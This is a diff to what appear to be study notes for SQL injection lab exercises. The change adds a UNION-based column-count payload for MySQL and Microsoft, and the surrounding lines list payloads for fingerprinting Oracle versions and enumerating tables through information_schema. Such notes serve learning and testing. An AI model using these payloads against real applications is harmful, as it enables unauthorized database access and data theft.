@@ -207,6 +207,7 @@ Update: python sqlmap.py --update
     - Find number of columns: `' UNION SELECT 'abc','def' FROM+dual--`  
     - GET /filter?category=`' UNION SELECT BANNER, NULL FROM v$version--`
 13. SQL injection attack, querying the **database type and version on MySQL and Microsoft**
+    - Find number of columns: `' UNION SELECT 'abc','def'#`  
     - GET /filter?category=`' UNION SELECT @@version,'def'#`
 15. SQL injection attack, **listing the database contents on non-Oracle databases**
     - tables: `' UNION SELECT table_name, NULL FROM information_schema.tables--`
